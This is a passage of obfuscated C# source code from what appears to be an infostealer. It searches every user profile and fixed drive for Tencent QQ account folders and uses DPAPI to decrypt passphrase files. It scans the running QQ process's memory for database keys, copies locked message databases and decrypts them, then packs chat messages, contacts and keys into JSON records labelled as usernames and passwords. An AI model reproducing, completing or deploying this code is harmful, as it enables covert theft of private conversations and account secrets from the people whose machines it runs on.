                        catch { }
                    }
                }
            }
            catch { }

            
            if (typeColIdx < 0) typeColIdx = 3;
            if (senderColIdx < 0) senderColIdx = 5;
            if (timeColIdx < 0) timeColIdx = 6;
            if (talkerColIdx < 0) talkerColIdx = 13;
            if (contentColIdx < 0) contentColIdx = 14;

            int minCols = Math.Max(Math.Max(Math.Max(talkerColIdx, contentColIdx), Math.Max(typeColIdx, senderColIdx)), timeColIdx) + 1;

            
            
            var pagesToScan = new List<int>();
            if (msgRootPage > 0 && msgRootPage <= totalPages)
                CollectBTreeLeafPages(dbData, msgRootPage - 1, pageSize, reserveBytes, totalPages, pagesToScan, 0);

            
            if (pagesToScan.Count == 0)
            {
                for (int pg = 0; pg < totalPages; pg++)
                    pagesToScan.Add(pg);
            }

            foreach (int pg in pagesToScan)
            {
                if (results.Count >= maxMessages) break;
                int off = pg * pageSize;
                int hdr = off + (pg == 0 ? 100 : 0);
                if (hdr >= dbData.Length) continue;
                if (dbData[hdr] != 0x0D) continue; 

                int cellCount = (dbData[hdr + 3] << 8) | dbData[hdr + 4];
                int ptrStart = hdr + 8;

                for (int c = 0; c < cellCount && c < 500 && results.Count < maxMessages; c++)
                {
                    int ptrOff = ptrStart + c * 2;
                    if (ptrOff + 2 > dbData.Length) break;
                    int cellOff = off + ((dbData[ptrOff] << 8) | dbData[ptrOff + 1]);
                    if (cellOff >= dbData.Length || cellOff < off) continue;

                    try
                    {
                        int p = cellOff;
                        int n;
                        long payloadLen;
                        ReadVarint(dbData, p, out payloadLen, out n); p += n;
                        long rowid;
                        ReadVarint(dbData, p, out rowid, out n); p += n;

                        if (payloadLen <= 0 || payloadLen > usableSize) continue;

                        long recHdrSize;
                        int hb;
                        ReadVarint(dbData, p, out recHdrSize, out hb);
                        int recHdrEnd = p + (int)recHdrSize;
                        int hp = p + hb;

                        var colTypes = new List<long>();
                        while (hp < recHdrEnd && hp < dbData.Length)
                        {
                            long st;
                            ReadVarint(dbData, hp, out st, out n);
                            hp += n;
                            colTypes.Add(st);
                        }

                        if (colTypes.Count < minCols) continue;

                        
                        if (talkerColIdx < colTypes.Count && (colTypes[talkerColIdx] < 13 || colTypes[talkerColIdx] % 2 != 1)) continue;

                        int dp = recHdrEnd;
                        long msgType = 0, isSender = 0, createTime = 0;
                        string strTalker = "", strContent = "";

                        for (int col = 0; col < colTypes.Count && dp < dbData.Length; col++)
                        {
                            long st = colTypes[col];
                            int colLen = SqliteColSize(st);
                            if (dp + colLen > dbData.Length) break;

                            if (col == typeColIdx) msgType = ReadSqliteInt(dbData, dp, colLen);
                            else if (col == senderColIdx) isSender = ReadSqliteInt(dbData, dp, colLen);
                            else if (col == timeColIdx) createTime = ReadSqliteInt(dbData, dp, colLen);
                            else if (col == talkerColIdx && st >= 13 && st % 2 == 1)
                            {
                                int tl = (int)(st - 13) / 2;
                                if (tl > 0 && dp + tl <= dbData.Length)
                                    strTalker = Encoding.UTF8.GetString(dbData, dp, tl);
                            }
                            else if (col == contentColIdx && st >= 13 && st % 2 == 1)
                            {
                                int tl = (int)(st - 13) / 2;
                                if (tl > 0 && dp + tl <= dbData.Length)
                                    strContent = Encoding.UTF8.GetString(dbData, dp, tl);
                            }

                            dp += colLen;
                        }

                        if (!string.IsNullOrEmpty(strTalker) && createTime > 1000000000)
                        {
                            if (msgType == 1 || msgType == 49 || msgType == 3 || msgType == 34 || msgType == 43)
                            {
                                string typeLabel = "text";
                                if (msgType == 3) typeLabel = "image";
                                else if (msgType == 34) typeLabel = "voice";
                                else if (msgType == 43) typeLabel = "video";
                                else if (msgType == 49) typeLabel = "ref";

                                results.Add(new string[] {
                                    strTalker,
                                    strContent.Length > 500 ? strContent.Substring(0, 500) : strContent,
                                    createTime.ToString(),
                                    isSender.ToString(),
                                    typeLabel
                                });
                            }
                        }
                    }
                    catch { }
                }
            }
            return results;
        }

        
        void CollectBTreeLeafPages(byte[] data, int pageIdx, int pageSize, int reserve, int totalPages, List<int> leaves, int depth)
        {
            if (depth > 20 || pageIdx < 0 || pageIdx >= totalPages) return;
            int off = pageIdx * pageSize;
            int hdr = off + (pageIdx == 0 ? 100 : 0);
            if (hdr >= data.Length) return;

            byte pageType = data[hdr];
            if (pageType == 0x0D) 
            {
                leaves.Add(pageIdx);
                return;
            }
            if (pageType != 0x05) return; 

            int cellCount = (data[hdr + 3] << 8) | data[hdr + 4];
            
            long rightChild = ((long)data[hdr + 8] << 24) | ((long)data[hdr + 9] << 16) | ((long)data[hdr + 10] << 8) | data[hdr + 11];
            int ptrStart = hdr + 12;

            
            for (int c = 0; c < cellCount && c < 500; c++)
            {
                int ptrOff = ptrStart + c * 2;
                if (ptrOff + 2 > data.Length) break;
                int cellOff = off + ((data[ptrOff] << 8) | data[ptrOff + 1]);
                if (cellOff + 4 >= data.Length || cellOff < off) continue;

                long childPage = ((long)data[cellOff] << 24) | ((long)data[cellOff + 1] << 16) | ((long)data[cellOff + 2] << 8) | data[cellOff + 3];
                if (childPage > 0 && childPage <= totalPages)
                    CollectBTreeLeafPages(data, (int)childPage - 1, pageSize, reserve, totalPages, leaves, depth + 1);
            }
            if (rightChild > 0 && rightChild <= totalPages)
                CollectBTreeLeafPages(data, (int)rightChild - 1, pageSize, reserve, totalPages, leaves, depth + 1);
        }

        
        Dictionary<string, string> _vpxrbDNCIuRVgnBEBak(byte[] dbData)
        {
            var contacts = new Dictionary<string, string>();
            if (dbData == null || dbData.Length < 100) return contacts;
            if (Encoding.ASCII.GetString(dbData, 0, 15) != _Q._S("P6hrrr+Yx2RMcdxSBTHn")) return contacts;

            int pageSize = (dbData[16] << 8) | dbData[17];
            if (pageSize == 1) pageSize = 65536;
            if (pageSize < 512) return contacts;
            int reserveBytes = dbData[20];

            int totalPages = dbData.Length / pageSize;

            for (int pg = 0; pg < totalPages; pg++)
            {
                int off = pg * pageSize;
                int hdr = off + (pg == 0 ? 100 : 0);
                if (hdr >= dbData.Length) continue;
                if (dbData[hdr] != 0x0D) continue;

                int cellCount = (dbData[hdr + 3] << 8) | dbData[hdr + 4];
                int ptrStart = hdr + 8;

                for (int c = 0; c < cellCount && c < 500; c++)
                {
                    int ptrOff = ptrStart + c * 2;
                    if (ptrOff + 2 > dbData.Length) break;
                    int cellOff = off + ((dbData[ptrOff] << 8) | dbData[ptrOff + 1]);
                    if (cellOff >= dbData.Length || cellOff < off) continue;

                    try
                    {
                        int p = cellOff;
                        int n;
                        long payloadLen;
                        ReadVarint(dbData, p, out payloadLen, out n); p += n;
                        long rowid;
                        ReadVarint(dbData, p, out rowid, out n); p += n;

                        long recHdrSize;
                        int hb;
                        ReadVarint(dbData, p, out recHdrSize, out hb);
                        int recHdrEnd = p + (int)recHdrSize;
                        int hp = p + hb;

                        var colTypes = new List<long>();
                        while (hp < recHdrEnd && hp < dbData.Length)
                        {
                            long st;
                            ReadVarint(dbData, hp, out st, out n);
                            hp += n;
                            colTypes.Add(st);
                        }

                        
                        if (colTypes.Count < 7) continue;
                        if (colTypes[0] < 13 || colTypes[0] % 2 != 1) continue;

                        int dp = recHdrEnd;
                        string userName = "", remark = "", nickName = "";

                        for (int col = 0; col < colTypes.Count && dp < dbData.Length; col++)
                        {
                            long st = colTypes[col];
                            int colLen = SqliteColSize(st);
                            if (dp + colLen > dbData.Length) break;

                            if ((col == 0 || col == 3 || col == 6) && st >= 13 && st % 2 == 1)
                            {
                                int tl = (int)(st - 13) / 2;
                                if (tl > 0 && dp + tl <= dbData.Length)
                                {
                                    string val = Encoding.UTF8.GetString(dbData, dp, tl);
                                    if (col == 0) userName = val;
                                    else if (col == 3) nickName = val;
                                    else if (col == 6) remark = val;
                                }
                            }
                            dp += colLen;
                        }

                        if (!string.IsNullOrEmpty(userName))
                        {
                            string display = !string.IsNullOrEmpty(remark) ? remark : nickName;
                            if (!string.IsNullOrEmpty(display))
                                contacts[userName] = display;
                        }
                    }
                    catch { }
                }
            }
            return contacts;
        }

        
        
        
        [System.Runtime.ExceptionServices.HandleProcessCorruptedStateExceptions]
        [System.Security.SecurityCritical]
        bool _DtarOcGqcb(StringBuilder sb, bool first)
        {
            var qqAccounts = new List<string[]>(); 

            
            string docsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string tencentFiles = Path.Combine(docsPath, _Q._S("OJxJpK6TkyJlat1WAg=="));
            if (Directory.Exists(tencentFiles))
            {
                try
                {
                    foreach (string dir in Directory.GetDirectories(tencentFiles))
                    {
                        string name = Path.GetFileName(dir);
                        if (name.Length >= 5 && name.Length <= 12 && IsNumeric(name))
                            qqAccounts.Add(new string[] { dir, name, "qq-classic" });
                        
                        string ntSub = Path.Combine(dir, _Q._S("Ao14tro="));
                        if (Directory.Exists(ntSub))
                            qqAccounts.Add(new string[] { ntSub, name, "ntqq-tf" });
                    }
                }
                catch { }
            }

            
            string ntqqPath1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), _Q._S("OJxJpK6Tkw=="), "QQ");
            if (Directory.Exists(ntqqPath1))
            {
                try
                {
                    foreach (string dir in Directory.GetDirectories(ntqqPath1))
                    {
                        string name = Path.GetFileName(dir);
                        if (name.Length >= 5)
                            qqAccounts.Add(new string[] { dir, name, "ntqq" });
                    }
                }
                catch { }
            }

            
            string[] ntqqExtraPaths = new string[] {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), _Q._S("OJxJpK6Tkw=="), _Q._S("Pahpkw==")),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "QQ"),
            };
            foreach (string np in ntqqExtraPaths)
            {
                if (!Directory.Exists(np)) continue;
                try
                {
                    foreach (string dir in Directory.GetDirectories(np))
                        qqAccounts.Add(new string[] { dir, Path.GetFileName(dir), "ntqq-new" });
                }
                catch { }
            }

            
            try
            {
                foreach (var drv in DriveInfo.GetDrives())
                {
                    if (drv.DriveType != DriveType.Fixed) continue;
                    string[] tfCandidates = new string[] {
                        Path.Combine(drv.RootDirectory.FullName, "QQ", _Q._S("OJxJpK6TkyJlat1WAg==")),
                        Path.Combine(drv.RootDirectory.FullName, _Q._S("OJxJpK6TkyJlat1WAg==")),
                    };
                    foreach (string tf in tfCandidates)
                    {
                        if (!Directory.Exists(tf)) continue;
                        foreach (string dir in Directory.GetDirectories(tf))
                        {
                            string name = Path.GetFileName(dir);
                            if (name.Length >= 5 && name.Length <= 12 && IsNumeric(name))
                            {
                                string ntDb = Path.Combine(dir, _Q._S("Ao14tro="), _Q._S("Ao14o6k="));
                                if (Directory.Exists(ntDb))
                                    qqAccounts.Add(new string[] { dir, name, "ntqq-custom" });
                                else
                                    qqAccounts.Add(new string[] { dir, name, "qq-classic" });
                            }
                        }
                    }
                }
            }
            catch { }

            
            if (qqAccounts.Count == 0)
            {
                string usersRoot = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") ?? "C:", "Users");
                if (Directory.Exists(usersRoot))
                {
                    try
                    {
                        foreach (string ud in Directory.GetDirectories(usersRoot))
                        {
                            string dn = Path.GetFileName(ud).ToLowerInvariant();
                            if (dn == "public" || dn == "default" || dn == "default user" || dn == "all users") continue;
                            string tf = Path.Combine(ud, "Documents", _Q._S("OJxJpK6TkyJlat1WAg=="));
                            if (Directory.Exists(tf))
                            {
                                foreach (string dir in Directory.GetDirectories(tf))
                                {
                                    string name = Path.GetFileName(dir);
                                    if (name.Length >= 5 && name.Length <= 12 && IsNumeric(name))
                                        qqAccounts.Add(new string[] { dir, name, "qq-classic" });
                                }
                            }
                            
                            string ntqq = Path.Combine(ud, "AppData", "Roaming", _Q._S("OJxJpK6Tkw=="), "QQ");
                            if (Directory.Exists(ntqq))
                            {
                                foreach (string dir in Directory.GetDirectories(ntqq))
                                    qqAccounts.Add(new string[] { dir, Path.GetFileName(dir), "ntqq" });
                            }
                        }
                    }
                    catch { }
                }
            }

            if (qqAccounts.Count == 0) return first;

            
            string qqVersion = "";
            byte[] ntqqMemKey = null;
            try
            {
                var qqProcs = Process.GetProcessesByName("QQ");
                if (qqProcs.Length > 0)
                {
                    try { qqVersion = qqProcs[0].MainModule.FileVersionInfo.FileVersion; } catch { }
                    
                    try { ntqqMemKey = _usXOdqFcxRajyZQutJlKeYFb(qqProcs); } catch { }
                }
            }
            catch { }

            foreach (var info in qqAccounts)
            {
                string dataDir = info[0];
                string qqNum = info[1];
                string qqType = info[2];

                
                byte[] ntqqKey = null;
                string keySource = "none";
                if (qqType.StartsWith("ntqq"))
                {
                    ntqqKey = _WGSqDeclWQTWkOBiZ(dataDir);
                    if (ntqqKey != null) keySource = "dpapi";
                    else if (ntqqMemKey != null) { ntqqKey = ntqqMemKey; keySource = "memory"; }
                }

                if (!first) sb.Append(",");
                first = false;
                sb.Append(string.Format(
                    "{{\"source\":\"qq\",\"target\":\"{0}\",\"username\":\"{1}\",\"password\":\"{2}\",\"type\":2}}",
                    _AexenijxeK("type=" + qqType + " ver=" + qqVersion + " dir=" + dataDir),
                    _AexenijxeK(qqNum),
                    _AexenijxeK(ntqqKey != null ? "key_" + keySource + "=" + BytesToHex(ntqqKey) : "data_found")));

                
                try
                {
                    var allDbs = new List<string>();
                    var ntMsgDbs = new List<string>();
                    string[] qqDbPatterns = new string[] { "*.db", "*.mdb" };
                    var seen = new HashSet<string>();
                    foreach (string pattern in qqDbPatterns)
                    {
                        foreach (string f in Directory.GetFiles(dataDir, pattern, SearchOption.AllDirectories))
                        {
                            if (seen.Contains(f)) continue;
                            seen.Add(f);
                            long sz = 0;
                            try { sz = new FileInfo(f).Length; } catch { }
                            if (sz < 4096 || sz > 100 * 1024 * 1024) continue;
                            allDbs.Add(f);
                            string relLower = f.Substring(dataDir.Length + 1).ToLowerInvariant();
                            string fnLower = Path.GetFileName(f).ToLowerInvariant();
                            if (relLower.Contains(_Q._S("Ao14o6k=")) && (fnLower.Contains("msg") || fnLower == "nt_msg.db"))
                                ntMsgDbs.Add(f);
                            if (allDbs.Count > 60) break;
                        }
                        if (allDbs.Count > 60) break;
                    }

                    
                    if (!first) sb.Append(",");
                    first = false;
                    sb.Append(string.Format(
                        "{{\"source\":\"qq-db\",\"target\":\"总计{0}个DB, 消息DB{1}个\",\"username\":\"{2}\",\"password\":\"key={3}\",\"type\":9}}",
                        allDbs.Count, ntMsgDbs.Count, _AexenijxeK(qqNum), keySource));

                    
                    if (ntqqKey != null && ntMsgDbs.Count > 0)
                    {
                        int totalExported = 0;
                        foreach (string mDb in ntMsgDbs)
                        {
                            if (totalExported >= 300) break;
                            string fn = Path.GetFileName(mDb).ToLowerInvariant();
                            string decryptStatus = "";
                            try
                            {
                                string tmpQq = Path.Combine(Path.GetTempPath(), "qq_" + Guid.NewGuid().ToString("N").Substring(0, 6));
                                CopyLockedFile(mDb, tmpQq);
                                try
                                {
                                    byte[] rawFile = File.ReadAllBytes(tmpQq);
                                    
                                    byte[] encBytes;
                                    if (rawFile.Length > 1024 + 4096)
                                    {
                                        encBytes = new byte[rawFile.Length - 1024];
                                        Array.Copy(rawFile, 1024, encBytes, 0, encBytes.Length);
                                    }
                                    else encBytes = rawFile;

                                    byte[] decBytes = TryDecryptDb(ntqqKey, encBytes, 48, out decryptStatus);
                                    if (decBytes != null)
                                    {
                                        var msgs = _kkQVDTPepKKNCydeK(decBytes, 200);
                                        decryptStatus += ",parsed=" + msgs.Count;
                                        foreach (var msg in msgs)
                                        {
                                            if (totalExported >= 300) break;
                                            if (!first) sb.Append(",");
                                            first = false;
                                            sb.Append(string.Format(
                                                "{{\"source\":\"qq-msg\",\"target\":\"{0}\",\"username\":\"{1}\",\"password\":\"{2}\",\"type\":9}}",
                                                _AexenijxeK(msg[0]),
                                                _AexenijxeK(msg[1]),
                                                _AexenijxeK(msg[2])));
                                            totalExported++;
                                        }
                                    }
                                }
                                finally { try { File.Delete(tmpQq); } catch { } }
                            }
                            catch (Exception dex) { decryptStatus = "error:" + dex.GetType().Name; }
                            if (!first) sb.Append(",");
                            first = false;
                            sb.Append(string.Format(
                                "{{\"source\":\"qq-decrypt\",\"target\":\"{0}\",\"username\":\"{1}\",\"password\":\"{2}\",\"type\":9}}",
                                _AexenijxeK(fn), _AexenijxeK(qqNum), _AexenijxeK(decryptStatus)));
                        }
                    }
                    else if (ntqqKey == null && qqType.StartsWith("ntqq"))
                    {
                        if (!first) sb.Append(",");
                        first = false;
                        sb.Append(string.Format(
                            "{{\"source\":\"qq-decrypt\",\"target\":\"未提取到密钥\",\"username\":\"{0}\",\"password\":\"key={1}\",\"type\":9}}",
                            _AexenijxeK(qqNum), keySource));
                    }
                }
                catch (Exception qex)
                {
                    if (!first) sb.Append(",");
                    first = false;
                    sb.Append(string.Format(
                        "{{\"source\":\"qq-error\",\"target\":\"\",\"username\":\"{0}\",\"password\":\"{1}\",\"type\":9}}",
                        _AexenijxeK(qqNum), _AexenijxeK("enum_error:" + qex.GetType().Name)));
                }
            }
            return first;
        }

        
        byte[] _WGSqDeclWQTWkOBiZ(string dataDir)
        {
            
            string[] keyPaths = new string[] {
                Path.Combine(dataDir, _Q._S("Ao14o6k="), _Q._S("HJhUtLuVlWNQZg==")),
                Path.Combine(dataDir, "databases", _Q._S("HJhUtLuVlWNQZg==")),
                Path.Combine(dataDir, _Q._S("HJhUtLuVlWNQZg==")),
            };
            
            try
            {
                string cfgDir = Path.Combine(dataDir, "config");
                if (Directory.Exists(cfgDir))
                {
                    foreach (string f in Directory.GetFiles(cfgDir, "passphrase*", SearchOption.AllDirectories))
                        keyPaths = new List<string>(keyPaths) { f }.ToArray();
                }
            }
            catch { }

            foreach (string kp in keyPaths)
            {
                if (!File.Exists(kp)) continue;
                try
                {
                    byte[] raw = File.ReadAllBytes(kp);
                    if (raw.Length < 16) continue;

                    
                    byte[] decrypted = _MEwvDWlydaWx(raw, false);
                    if (decrypted != null && decrypted.Length >= 16)
                    {
                        
                        
                        string decStr = Encoding.UTF8.GetString(decrypted).Trim();
                        if (decStr.Length == 64 && IsHexString(decStr))
                            return HexToBytes(decStr);
                        if (decrypted.Length == 32)
                            return decrypted;
                        
                        if (decrypted.Length > 32)
                        {
                            byte[] key32 = new byte[32];
                            Array.Copy(decrypted, key32, 32);
                            return key32;
                        }
                    }

                    
                    decrypted = _MEwvDWlydaWx(raw, true);
                    if (decrypted != null && decrypted.Length >= 16)
                    {
                        if (decrypted.Length == 32) return decrypted;
                        string decStr = Encoding.UTF8.GetString(decrypted).Trim();
                        if (decStr.Length == 64 && IsHexString(decStr))
                            return HexToBytes(decStr);
                    }
                }
                catch { }
            }
            return null;
        }

        
        byte[] _usXOdqFcxRajyZQutJlKeYFb(Process[] procs)
        {
            var rawKeys = ScanProcessForRawKeys(new string[] { "QQ" });
            if (rawKeys.Count == 0) return null;

            
            string[] ntqqDbSearchPaths = new string[] {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), _Q._S("OJxJpK6Tkw=="), "QQ"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), _Q._S("OJxJpK6Tkw=="), _Q._S("Pahpkw==")),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "QQ"),
            };
            
            try
            {
                foreach (var drv in DriveInfo.GetDrives())
                {
                    if (drv.DriveType != DriveType.Fixed) continue;
                    string tf = Path.Combine(drv.RootDirectory.FullName, "QQ", _Q._S("OJxJpK6TkyJlat1WAg=="));
                    if (!Directory.Exists(tf)) continue;
                    foreach (string dir in Directory.GetDirectories(tf))
                    {
                        string ntDb = Path.Combine(dir, _Q._S("Ao14tro="), _Q._S("Ao14o6k="));
                        if (Directory.Exists(ntDb))
                        {
                            var tmp = new List<string>(ntqqDbSearchPaths);
                            tmp.Add(ntDb);
                            ntqqDbSearchPaths = tmp.ToArray();
                        }
                    }
                }
            }
            catch { }

            foreach (string searchRoot in ntqqDbSearchPaths)
            {
                if (!Directory.Exists(searchRoot)) continue;
                try
                {
                    foreach (string dbFile in Directory.GetFiles(searchRoot, "*.db", SearchOption.AllDirectories))
                    {
                        try
                        {
                            long sz = new FileInfo(dbFile).Length;
                            if (sz < 8192) continue;
                            
                            byte[] page1 = new byte[4096];
                            using (var fs = new FileStream(dbFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
                            {
                                fs.Seek(1024, SeekOrigin.Begin);
                                if (fs.Read(page1, 0, 4096) < 4096) continue;
                            }
                            if (Encoding.ASCII.GetString(page1, 0, 6) == "SQLite") continue;
                            byte[] salt = new byte[16];
                            Array.Copy(page1, 0, salt, 0, 16);
                            byte[] key = FindRawKeyForDb(rawKeys, salt, page1, 48);
                            if (key != null) return key;
                        }
                        catch { }
                    }
                }
                catch { }
            }

            
            return rawKeys.Count > 0 ? rawKeys[0].Key : null;
        }

        
        List<string[]> _kkQVDTPepKKNCydeK(byte[] dbData, int maxMsg)
        {
            
            var results = new List<string[]>();
            if (dbData == null || dbData.Length < 100) return results;
            if (Encoding.ASCII.GetString(dbData, 0, 15) != _Q._S("P6hrrr+Yx2RMcdxSBTHn")) return results;

            int pageSize = (dbData[16] << 8) | dbData[17];
            if (pageSize == 1) pageSize = 65536;
            if (pageSize < 512) return results;
            int reserveBytes = dbData[20];
            int totalPages = dbData.Length / pageSize;

            for (int pg = 0; pg < totalPages && results.Count < maxMsg; pg++)
            {
                int off = pg * pageSize;
                int hdr = off + (pg == 0 ? 100 : 0);
                if (hdr >= dbData.Length) continue;
                if (dbData[hdr] != 0x0D) continue;

                int cellCount = (dbData[hdr + 3] << 8) | dbData[hdr + 4];
                int ptrStart = hdr + 8;

                for (int c = 0; c < cellCount && c < 500 && results.Count < maxMsg; c++)
                {
                    int ptrOff = ptrStart + c * 2;
                    if (ptrOff + 2 > dbData.Length) break;
                    int cellOff = off + ((dbData[ptrOff] << 8) | dbData[ptrOff + 1]);
                    if (cellOff >= dbData.Length || cellOff < off) continue;

                    try
                    {
                        int p = cellOff;
                        int n;
                        long payloadLen;
                        ReadVarint(dbData, p, out payloadLen, out n); p += n;
                        long rowid;
                        ReadVarint(dbData, p, out rowid, out n); p += n;

                        long recHdrSize;
                        int hb;
                        ReadVarint(dbData, p, out recHdrSize, out hb);
                        int recHdrEnd = p + (int)recHdrSize;
                        int hp = p + hb;

                        var colTypes = new List<long>();
                        while (hp < recHdrEnd && hp < dbData.Length)
                        {
                            long st;
                            ReadVarint(dbData, hp, out st, out n);
                            hp += n;
                            colTypes.Add(st);
                        }

                        
                        if (colTypes.Count < 5) continue;

                        int dp = recHdrEnd;
                        string content = null;
                        string talker = null;
                        long timestamp = 0;

                        for (int col = 0; col < colTypes.Count && dp < dbData.Length; col++)
                        {
                            long st = colTypes[col];
                            int colLen = SqliteColSize(st);
                            if (dp + colLen > dbData.Length) break;

                            
                            if (st >= 13 && st % 2 == 1)
                            {
                                int tl = (int)(st - 13) / 2;
                                if (tl > 2 && tl < 2000 && dp + tl <= dbData.Length)
                                {
                                    string val = Encoding.UTF8.GetString(dbData, dp, tl);
                                    
                                    if (talker == null && (val.Contains("@") || IsNumeric(val) || val.Length < 30))
                                        talker = val;
                                    else if (content == null && val.Length > 0)
                                        content = val.Length > 500 ? val.Substring(0, 500) : val;
                                }
                            }
                            else if (st >= 1 && st <= 6 && timestamp == 0)
                            {
                                long v = ReadSqliteInt(dbData, dp, colLen);
                                if (v > 1600000000 && v < 2000000000) timestamp = v;
                            }

                            dp += colLen;
                        }

                        if (!string.IsNullOrEmpty(content) && timestamp > 0)
                        {
                            results.Add(new string[] {
                                talker ?? "unknown",
                                content,
                                timestamp.ToString()
                            });
                        }
                    }
                    catch { }
                }
            }
            return results;
        }

        static bool IsHexString(string s)
        {
            foreach (char c in s)
            {
                if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')))
                    return false;
            }
            return true;
        }

        static byte[] HexToBytes(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
                bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            return bytes;
        }

        static bool IsNumeric(string s)
        {
            foreach (char c in s) { if (c < '0' || c > '9') return false; }
            return true;
        }

        
        byte[] TripleDESDecrypt(byte[] key, byte[] iv, byte[] data)
        {
            using (var tdes = System.Security.Cryptography.TripleDES.Create())
            {
                tdes.Mode = CipherMode.CBC;
                tdes.Padding = PaddingMode.None; 
                tdes.Key = key;
                tdes.IV = iv;
                using (var dec = tdes.CreateDecryptor())
                {
                    byte[] plain = dec.TransformFinalBlock(data, 0, data.Length);
                    
                    if (plain.Length > 0)
                    {
                        int pad = plain[plain.Length - 1];
                        if (pad > 0 && pad <= 8)
                        {
                            bool validPad = true;
                            for (int i = plain.Length - pad; i < plain.Length; i++)
                                if (plain[i] != pad) { validPad = false; break; }
                            if (validPad)
                            {
                                byte[] trimmed = new byte[plain.Length - pad];
                                Array.Copy(plain, trimmed, trimmed.Length);
                                return trimmed;
                            }
                        }
                    }
                    return plain;
                }
            }
        }

        byte[] AesCBCDecrypt(byte[] key, byte[] iv, byte[] data)
        {
            using (var aes = System.Security.Cryptography.Aes.Create())
            {
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.None;
                aes.Key = key;
                aes.IV = iv;
                using (var dec = aes.CreateDecryptor())
                {
                    byte[] plain = dec.TransformFinalBlock(data, 0, data.Length);
                    if (plain.Length > 0)
                    {
                        int pad = plain[plain.Length - 1];
                        if (pad > 0 && pad <= 16)
                        {
                            bool validPad = true;
                            for (int i = plain.Length - pad; i < plain.Length; i++)
                                if (plain[i] != pad) { validPad = false; break; }
                            if (validPad)
                            {
                                byte[] trimmed = new byte[plain.Length - pad];
                                Array.Copy(plain, trimmed, trimmed.Length);
                                return trimmed;
                            }
                        }
                    }
                    return plain;
                }
            }
        }

        byte[] PBKDF2_SHA256(byte[] password, byte[] salt, int iterations, int dkLen)
        {
            using (var hmac = new HMACSHA256(password))
            {
                byte[] result = new byte[dkLen];
                int blocks = (dkLen + 31) / 32;
                int offset = 0;
                for (int i = 1; i <= blocks; i++)
                {
                    byte[] block = new byte[salt.Length + 4];
                    Array.Copy(salt, 0, block, 0, salt.Length);
                    block[salt.Length] = (byte)((i >> 24) & 0xFF);
                    block[salt.Length + 1] = (byte)((i >> 16) & 0xFF);
                    block[salt.Length + 2] = (byte)((i >> 8) & 0xFF);
                    block[salt.Length + 3] = (byte)(i & 0xFF);
                    byte[] u = hmac.ComputeHash(block);
                    byte[] T = (byte[])u.Clone();
                    for (int j = 1; j < iterations; j++)
                    {
                        u = hmac.ComputeHash(u);
                        for (int k = 0; k < T.Length; k++) T[k] ^= u[k];
                    }
                    int toCopy = Math.Min(T.Length, dkLen - offset);
                    Array.Copy(T, 0, result, offset, toCopy);
                    offset += toCopy;
                }
                return result;
            }
        }

        
        static bool Asn1ReadTag(byte[] data, ref int pos, int expectedTag, out int length)
        {
            length = 0;
            if (pos >= data.Length) return false;
            int tag = data[pos++];
            if (expectedTag != 0 && tag != expectedTag) return false;
            if (pos >= data.Length) return false;
            int b = data[pos++];
            if (b < 0x80) { length = b; return true; }
            int numBytes = b & 0x7F;
            if (numBytes > 4 || pos + numBytes > data.Length) return false;
            for (int i = 0; i < numBytes; i++) length = (length << 8) | data[pos++];
            return true;
        }

        static bool ByteArrayEquals(byte[] a, byte[] b)
        {
            if (a.Length != b.Length) return false;
            for (int i = 0; i < a.Length; i++) if (a[i] != b[i]) return false;
            return true;
        }

        static byte[] Concat(byte[] a, byte[] b)
        {
            byte[] r = new byte[a.Length + b.Length];
            Array.Copy(a, 0, r, 0, a.Length);
            Array.Copy(b, 0, r, a.Length, b.Length);
            return r;
        }

        static byte[] SHA1Hash(byte[] data)
        {
            using (var sha = System.Security.Cryptography.SHA1.Create()) return sha.ComputeHash(data);
        }

        static byte[] HMACSHA1Hash(byte[] key, byte[] data)
        {
            using (var hmac = new HMACSHA1(key)) return hmac.ComputeHash(data);
        }

        string ExtractJsonStrAt(string json, int keyIdx)
        {
            int colon = json.IndexOf(':', keyIdx);
            if (colon < 0) return "";
            int sq = json.IndexOf('"', colon + 1);
            if (sq < 0) return "";
            int eq = json.IndexOf('"', sq + 1);
            if (eq < 0) return "";
            return json.Substring(sq + 1, eq - sq - 1);
        }

        string _JCaMrqQFAzRQa(byte[] key, byte[] nonce, byte[] ciphertextWithTag)
        {
            
            if (ciphertextWithTag == null || ciphertextWithTag.Length < 16) return null;
            int tagLen = 16;
            int ctLen = ciphertextWithTag.Length - tagLen;
            if (ctLen <= 0) return null;
            byte[] ct = new byte[ctLen];
            byte[] tag = new byte[tagLen];
            Array.Copy(ciphertextWithTag, 0, ct, 0, ctLen);
            Array.Copy(ciphertextWithTag, ctLen, tag, 0, tagLen);

            IntPtr hAlg = IntPtr.Zero, hKey = IntPtr.Zero;
            IntPtr noncePtr = IntPtr.Zero, tagPtr = IntPtr.Zero, infoPtr = IntPtr.Zero;
            try
            {
                if (BCryptOpenAlgorithmProvider(out hAlg, "AES", "Microsoft Primitive Provider", 0) != 0) return null;
                byte[] gcmMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
                if (BCryptSetProperty(hAlg, "ChainingMode", gcmMode, gcmMode.Length, 0) != 0) return null;
                if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0) != 0) return null;

                
                noncePtr = Marshal.AllocHGlobal(nonce.Length);
                Marshal.Copy(nonce, 0, noncePtr, nonce.Length);
                tagPtr = Marshal.AllocHGlobal(tag.Length);
                Marshal.Copy(tag, 0, tagPtr, tag.Length);

                int ptrSize = IntPtr.Size;
                
                int structSize = (ptrSize == 8) ? 88 : 56;
                infoPtr = Marshal.AllocHGlobal(structSize);
                
